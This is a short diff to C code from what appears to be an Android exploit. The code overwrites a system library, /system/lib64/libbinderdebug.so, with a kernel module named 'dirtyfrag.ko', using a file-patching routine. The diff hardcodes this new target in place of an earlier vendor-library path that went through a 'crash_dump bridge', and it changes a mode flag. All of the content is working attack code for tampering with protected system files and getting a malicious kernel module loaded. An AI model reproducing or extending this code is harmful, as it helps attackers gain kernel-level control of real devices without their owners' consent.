@@ -405,18 +405,20 @@ static int patch_ko(struct Reporter *reporter) {
     free(sh_buf);
     if (ret) { REPORTLN("patch #1 failed: %d", ret); return ret; }
 
+    // Force target to the verified readable system library path
+    strcpy(libcxx_ko_target, "/system/lib64/libbinderdebug.so");
+
     size_t ko_len_padded;
     char *ko_buf = pad16(ko->start, (size_t)(ko->end - ko->start), &ko_len_padded);
     if (!ko_buf) return -1;
 
-    /* patch #2: write KO into vendor lib via crash_dump bridge */
+    /* patch #2: write KO into system lib via standard pread */
     REPORTLN("* patch #2 (%s ← dirtyfrag.ko, %zu bytes)", libcxx_ko_target, ko_len_padded);
-    ret = patch_file_cbc(libcxx_ko_target, ko_buf, ko_len_padded, 0, 1, reporter);
+    ret = patch_file_cbc(libcxx_ko_target, ko_buf, ko_len_padded, 0, 0, reporter);
     free(ko_buf);
     if (ret) REPORTLN("patch #2 failed: %d", ret);
     return ret;
 }
-
 static int patch_hook(const char *lib, const char *sym,
                       char *stage_data, uint32_t stage_len, char *stage_start,
                       char *first_inst_copy,
